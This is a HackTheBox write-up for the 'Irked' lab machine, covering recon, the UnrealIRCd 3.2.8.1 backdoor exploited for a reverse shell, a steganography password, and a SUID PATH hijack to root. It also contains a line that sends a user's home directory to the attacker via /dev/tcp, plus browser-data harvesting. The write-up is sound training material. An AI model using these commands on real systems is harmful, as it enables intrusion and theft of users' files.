---
render_with_liquid: false
title: HackTheBox Writeup  Irked
date: 2024-02-07 11:57 +1400
tags: [hackthebox, nmap, linux, feroxbuster, rpcinfo, unrealircd, irc, discover-secrets, weak-permissions, steganography, stegseek, suid, hack-browser-data, oscp-like]
---



Irked is a pretty simple and straight-forward box which requires basic enumeration skills. It shows the need to scan all ports on machines and to investigate any out of the place binaries found while enumerating a system.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked]
└─$ pt init '10.129.45.88 irked.htb Irked'
+---------+--------+--------------+-----------+
| PROFILE | STATUS |      IP      |  DOMAIN   |
+---------+--------+--------------+-----------+
| irked   | on     | 10.129.45.88 | irked.htb |
| irked   | on     | 10.129.45.88 | Irked     |
+---------+--------+--------------+-----------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Wed Feb  7 11:22:20 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,111,6697,8067,41884,65534, Irked
Nmap scan report for Irked (10.129.45.88)
Host is up, received user-set (0.089s latency).
Scanned at 2024-02-07 11:22:20 CST for 18s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI+wKAAyWgx/P7Pe78y6/80XVTd6QEv6t5ZIpdzKvS8qbkChLB7LC+/HVuxLshOUtac4oHr/IF9YBytBoaAte87fxF45o3HS9MflMA4511KTeNwc5QuhdHzqXX9ne0ypBAgFKECBUJqJ23Lp2S9KuYEYLzUhSdUEYqiZlcc65NspAAAAFQDwgf5Wh8QRu3zSvOIXTk+5g0eTKQAAAIBQuTzKnX3nNfflt++gnjAJ/dIRXW/KMPTNOSo730gLxMWVeId3geXDkiNCD/zo5XgMIQAWDXS+0t0hlsH1BfrDzeEbGSgYNpXoz42RSHKtx7pYLG/hbUr4836olHrxLkjXCFuYFo9fCDs2/QsAeuhCPgEDjLXItW9ibfFqLxyP2QAAAIAE5MCdrGmT8huPIxPI+bQWeQyKQI/lH32FDZb4xJBPrrqlk9wKWOa1fU2JZM0nrOkdnCPIjLeq9+Db5WyZU2u3rdU8aWLZy8zF9mXZxuW/T3yXAV5whYa4QwqaVaiEzjcgRouex0ev/u+y5vlIf4/SfAsiFQPzYKomDiBtByS9XA==
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDGASnp9kH4PwWZHx/V3aJjxLzjpiqc2FOyppTFp7/JFKcB9otDhh5kWgSrVDVijdsK95KcsEKC/R+HJ9/P0KPdf4hDvjJXB1H3Th5/83gy/TEJTDJG16zXtyR9lPdBYg4n5hhfFWO1PxM9m41XlEuNgiSYOr+uuEeLxzJb6ccq0VMnSvBd88FGnwpEoH1JYZyyTnnbwtBrXSz1tR5ZocJXU4DmI9pzTNkGFT+Q/K6V/sdF73KmMecatgcprIENgmVSaiKh9mb+4vEfWLIe0yZ97c2EdzF5255BalP3xHFAY0jROiBnUDSDlxyWMIcSymZPuE1N6Tu8nQ/pXxKvUar
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeZigS1PimiXXJSqDy2KTT4UEEphoLAk8/ftEXUq0ihDOFDrpgT0Y4vYgYPXboLlPBKBc0nVBmKD+6pvSwIEy8=
|   256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6m+0iYo68rwVQDYDejkVvsvg22D8MN+bNWMUEOWrhj
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39089/udp6  status
|   100024  1          41884/tcp   status
|   100024  1          52633/udp   status
|_  100024  1          54439/tcp6  status
6697/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
8067/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
41884/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
65534/tcp open  irc     syn-ack ttl 63 UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Feb  7 11:22:38 2024 -- 1 IP address (1 host up) scanned in 18.11 seconds
```

## 80 - HTTP : Page under construction


### Info

```ruby
http://Irked [200] [] [Apache/2.4.10 (Debian)] [Apache HTTP Server:2.4.10,Debian] [6b8270208412489c47e6939c25ac1f360047be05]
```

![](/assets/obsidian/0e76be2c3e181412c080f60b17c05ce5.png)

### Directory

```bash
feroxbuster -t 100 -w /usr/share/dirb/wordlists/big.txt -u 'http://irked/' -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked]
└─$ cat ferox_80.txt| awk '$1!=404' | grep -v 'http://irked/manual/'
200      GET      210l      600w    64135c http://irked/irked.jpg
200      GET        3l        7w       72c http://irked/
```


## 6697 - IRC : UnrealIRCd

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked]
└─$ sudo nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 Irked
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-07 11:57 CST
Nmap scan report for Irked (10.129.45.88)
Host is up (0.091s latency).
rDNS record for 10.129.45.88: irked.htb
Not shown: 341 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6697/tcp open  irc     UnrealIRCd
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.37 seconds
```

## 111 - Portmapper

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked]
└─$ rpcinfo irked.htb
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100024    1    udp       0.0.0.0.205.153        status     107
    100024    1    tcp       0.0.0.0.163.156        status     107
    100024    1    udp6      ::.152.177             status     107
    100024    1    tcp6      ::.212.167             status     107
```

## 8067 - IRC

Gathered a hostname `irked.htb` and user name `djmardov`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked]
└─$ rlwrap nc 10.129.45.88 8067 -nv
(UNKNOWN) [10.129.45.88] 8067 (?) open
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
ERROR :Closing Link: [10.10.14.9] (Ping timeout)

┌──(bravosec㉿fsociety)-[~/htb/Irked]
└─$ rlwrap nc Irked 8067
ERROR :Closing Link: [10.10.14.9] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
```


# User Flag
---

## Shell as ircd


### UnrealIRCD 3.2.8.1 backdoor

According to nmap script scan, there's a backdoor for `UnrealIRCD` version `3.2.8.1`

> https://seclists.org/fulldisclosure/2010/Jun/277

![](/assets/obsidian/8700681114bc5361b7c1235ee5ae34e0.png)

> POC : https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor

```bash
git clone https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor
cd UnrealIRCd-3.2.8.1-Backdoor
```

![](/assets/obsidian/f6a81e59b0bfdaff0eaf238922e05175.png)

With the prefix `AB;`, it will trigger the backdoor to execute commands

![](/assets/obsidian/8fb1501590530dd6ce93d8435c02a381.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked/exploit/UnrealIRCd-3.2.8.1-Backdoor]
└─$ sed -i -e 's/local_ip =.*/local_ip = "10.10.14.9"/' -e 's/local_port =.*/local_port = "1111"/' exploit.py

┌──(bravosec㉿fsociety)-[~/htb/Irked/exploit/UnrealIRCd-3.2.8.1-Backdoor]
└─$ python exploit.py -payload bash irked.htb 6697
Exploit sent successfully!
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.9] from (UNKNOWN) [10.129.45.88] 45070
bash: cannot set terminal process group (646): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
ircd@irked:~/Unreal3.2$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Irked]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
ircd@irked:~/Unreal3.2$ stty rows 50 columns 209
ircd@irked:~/Unreal3.2$ id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
ircd@irked:~/Unreal3.2$
```

## From ircd to djmardov


### Steg password

```bash
ircd@irked:~/Unreal3.2$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
djmardov:x:1000:1000:djmardov,,,:/home/djmardov:/bin/bash
ircd:x:1001:1001::/home/ircd:/bin/sh
```

Tried password reuse from passwords in `/home/ircd/Unreal3.2/unrealircd.conf` for user `djmardov`, but no luck

```bash
ircd@irked:~/Unreal3.2$ find / -name unrealircd.conf -type f 2>/dev/null
/home/ircd/Unreal3.2/unrealircd.conf
```

`ircd` was able to read some files from `djmardov`'s home directory

```bash
ircd@irked:~/Unreal3.2$ find /home -type f -not -path "/home/$USER/*" -readable -exec ls -latr {} + 2>/dev/null
-rw-r--r-- 1 djmardov djmardov  675 May 11  2018 /home/djmardov/.profile
-rw-r--r-- 1 djmardov djmardov  220 May 11  2018 /home/djmardov/.bash_logout
-rw-r--r-- 1 djmardov djmardov 3515 May 11  2018 /home/djmardov/.bashrc
-rw-r--r-- 1 djmardov djmardov   52 May 16  2018 /home/djmardov/Documents/.backup
```

```bash
ircd@irked:~/Unreal3.2$ cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

### Decrypt image stego

Talking about `steg`, there's only one image at port 80

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked/dump]
└─$ wget http://irked/irked.jpg
```

Extract files from image with the password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked/dump]
└─$ stegseek irked.jpg <(echo 'UPupDOWNdownLRlrBAbaSSss')
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "UPupDOWNdownLRlrBAbaSSss"
[i] Original filename: "pass.txt".
[i] Extracting to "irked.jpg.out".


┌──(bravosec㉿fsociety)-[~/htb/Irked/dump]
└─$ cat irked.jpg.out
Kab6h+m+bbp2J:HG
```

### Switch user

```bash
ircd@irked:~/Unreal3.2$ su - djmardov
Password:Kab6h+m+bbp2J:HG
djmardov@irked:~$ id
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
djmardov@irked:~$ cat user.txt
5443de7438d66beccb219965fe7744d6
djmardov@irked:~$
```

# Root Flag
---

## From djmardov to root


### SUID - Custom binary

There's a custom SUID binary `viewuser`

```bash
djmardov@irked:~$ find / -type f -perm -4000 -exec ls -latr {} + 2>/dev/null
-rwsr-sr-x 1 root   root          9468 Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root   root         96760 Aug 13  2014 /sbin/mount.nfs
-rwsr-sr-x 1 daemon daemon       50644 Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root   root         13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root   root         26344 Mar 29  2015 /bin/umount
-rwsr-xr-x 1 root   root         34684 Mar 29  2015 /bin/mount
-rwsr-xr-- 1 root   dip         338948 Apr 14  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root   root         34208 Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root   root         13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root         18072 Sep  8  2016 /usr/bin/pkexec
-rwsr-xr-- 1 root   messagebus  362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        161584 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root   root          9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root         53112 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root   root         78072 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root         43576 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root   root         52344 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root   root         38740 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root   root         38868 May 17  2017 /bin/su
-rwsr-sr-x 1 root   mail         96192 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root   root        562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root       1085300 Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-x 1 root   root          7328 May 16  2018 /usr/bin/viewuser
```

The binary was not stripped

```bash
djmardov@irked:~$ file /usr/bin/viewuser
/usr/bin/viewuser: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=69ba4bc75bf72037f1ec492bc4cde2550eeac4bb, not stripped
```

Neither **strace** nor **ltrace** was on the box

```bash
djmardov@irked:~$ ltrace
-su: ltrace: command not found
djmardov@irked:~$ strace
-su: strace: command not found
```

It will call `/tmp/listusers`

```bash
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-02-06 22:21 (:0)
sh: 1: /tmp/listusers: not found
```

```bash
djmardov@irked:~$ strings /usr/bin/viewuser
[...]
[^_]
This application is being devleoped to set and test user permissions
It is still being actively developed
/tmp/listusers
;*2$"
GCC: (Debian 7.2.0-8) 7.2.0
crtstuff.c
[...]
```

Create custom `/tmp/listusers` binary

```bash
djmardov@irked:~$ echo '/bin/bash' > /tmp/listusers
djmardov@irked:~$ chmod +x /tmp/listusers
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-02-06 22:21 (:0)
root@irked:~# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
root@irked:~# cat /root/root.txt
e77c6c82e8e02f6151076ff563d92b26
```

# Additional
---

## Failed attempts


### Harvest browser data

There's `mozilla`'s profile directory and other interesting directories

```bash
djmardov@irked:~$ ls -latr
total 14628
-rw-r--r--  1 djmardov djmardov      675 May 11  2018 .profile
-rw-r--r--  1 djmardov djmardov      220 May 11  2018 .bash_logout
-rw-r--r--  1 djmardov djmardov     3515 May 11  2018 .bashrc
lrwxrwxrwx  1 root     root            9 Nov  3  2018 .bash_history -> /dev/null
-rw-------  1 djmardov djmardov     4706 Nov  3  2018 .ICEauthority
drwx------  2 djmardov djmardov     4096 Sep  5  2022 .ssh
drwx------  2 djmardov djmardov     4096 Sep  5  2022 .gnupg
drwx------  3 djmardov djmardov     4096 Sep  5  2022 .local
drwx------ 15 djmardov djmardov     4096 Sep  5  2022 .config
drwx------  4 djmardov djmardov     4096 Sep  5  2022 .mozilla
drwxr-xr-x  2 djmardov djmardov     4096 Sep  5  2022 Downloads
drwxr-xr-x  2 djmardov djmardov     4096 Sep  5  2022 Videos
drwxr-xr-x  2 djmardov djmardov     4096 Sep  5  2022 Templates
drwxr-xr-x  2 djmardov djmardov     4096 Sep  5  2022 Public
drwxr-xr-x  2 djmardov djmardov     4096 Sep  5  2022 Pictures
drwxr-xr-x  2 djmardov djmardov     4096 Sep  5  2022 Music
drwxr-xr-x  2 djmardov djmardov     4096 Sep  5  2022 Desktop
drwx------ 13 djmardov djmardov     4096 Sep  5  2022 .cache
drwx------  3 djmardov djmardov     4096 Sep  5  2022 .gconf
drwxr-xr-x  2 djmardov djmardov     4096 Sep  5  2022 Documents
drwx------  3 djmardov djmardov     4096 Sep  5  2022 .dbus
drwxr-xr-x  4 root     root         4096 Sep  5  2022 ..
-rw-r-----  1 root     djmardov       33 Feb  6 22:21 user.txt
drwxr-xr-x 18 djmardov djmardov     4096 Feb  7 01:11 .
```

Download the whole user directory for further harvesting

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked]
└─$ nc -lvnp 443 > loot/djmardov.tar
```

```bash
djmardov@irked:~$ tar -czf djmardov.tar .
djmardov@irked:~$ cat djmardov.tar > /dev/tcp/10.10.14.9/443
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked/loot]
└─$ mkdir djmardov

┌──(bravosec㉿fsociety)-[~/htb/Irked/loot]
└─$ tar -xzf djmardov.tar -C djmardov
```

Extract data

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked/loot]
└─$ /opt/sectools/privesc/hack-browser-data-linux-amd64 -p djmardov/
[NOTICE] [browser.go:47,pickChromium] find browser Chrome failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Microsoft Edge failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Chrome Beta failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Opera failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Vivaldi failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Brave failed, profile folder does not exist
[NOTICE] [browser.go:98,pickFirefox] find browser firefox firefox-84p8ofq6.default success
[WARN] [bookmark.go:118,Parse] sql: Scan error on column index 4, name "title": converting NULL to string is unsupported
[WARN] [bookmark.go:118,Parse] sql: Scan error on column index 4, name "title": converting NULL to string is unsupported
[WARN] [bookmark.go:118,Parse] sql: Scan error on column index 4, name "title": converting NULL to string is unsupported
[NOTICE] [browsingdata.go:73,Output] output to file results/firefox_84p8ofq6_default_bookmark.csv success
[NOTICE] [browsingdata.go:73,Output] output to file results/firefox_84p8ofq6_default_history.csv success
```

Checked the dumped files but nothing interesting

```bash
┌──(bravosec㉿fsociety)-[~/htb/Irked/loot]
└─$ cat results/firefox_84p8ofq6_default_bookmark.csv
ID,Name,Type,URL,DateAdded
17,History,url,place:type=3&sort=4,2018-05-15T20:52:24+08:00
23,,url,place:folder=UNFILED_BOOKMARKS,2018-05-15T20:52:24+08:00
22,,url,place:folder=BOOKMARKS_MENU,2018-05-15T20:52:24+08:00
21,,url,place:folder=TOOLBAR,2018-05-15T20:52:24+08:00
19,Tags,url,place:type=6&sort=1,2018-05-15T20:52:24+08:00
18,Downloads,url,place:transition=7&sort=4,2018-05-15T20:52:24+08:00
14,Recent Tags,url,place:type=6&sort=14&maxResults=10,2018-05-12T01:39:43+08:00
7,Getting Started,url,https://www.mozilla.org/en-US/firefox/central/,2018-05-12T01:39:42+08:00
13,Most Visited,url,place:sort=8&maxResults=10,2018-05-12T01:39:42+08:00
12,About Us,url,https://www.mozilla.org/en-US/about/,2018-05-12T01:39:42+08:00
11,Get Involved,url,https://www.mozilla.org/en-US/contribute/,2018-05-12T01:39:42+08:00
10,Customize Firefox,url,https://www.mozilla.org/en-US/firefox/customize/,2018-05-12T01:39:42+08:00
9,Help and Tutorials,url,https://www.mozilla.org/en-US/firefox/help/,2018-05-12T01:39:42+08:00

┌──(bravosec㉿fsociety)-[~/htb/Irked/loot]
└─$ cat results/firefox_84p8ofq6_default_history.csv
Title,URL,VisitCount,LastVisitTime
,https://www.mozilla.org/en-US/firefox/central/,0,1970-01-01T08:00:00+08:00
,https://www.mozilla.org/en-US/firefox/help/,0,1970-01-01T08:00:00+08:00
,https://www.mozilla.org/en-US/firefox/customize/,0,1970-01-01T08:00:00+08:00
,https://www.mozilla.org/en-US/contribute/,0,1970-01-01T08:00:00+08:00
,https://www.mozilla.org/en-US/about/,0,1970-01-01T08:00:00+08:00
,place:sort=8&maxResults=10,0,1970-01-01T08:00:00+08:00
,place:type=6&sort=14&maxResults=10,0,1970-01-01T08:00:00+08:00
,place:type=3&sort=4,0,1970-01-01T08:00:00+08:00
,place:transition=7&sort=4,0,1970-01-01T08:00:00+08:00
,place:type=6&sort=1,0,1970-01-01T08:00:00+08:00
,place:folder=TOOLBAR,0,1970-01-01T08:00:00+08:00
,place:folder=BOOKMARKS_MENU,0,1970-01-01T08:00:00+08:00
,place:folder=UNFILED_BOOKMARKS,0,1970-01-01T08:00:00+08:00
```

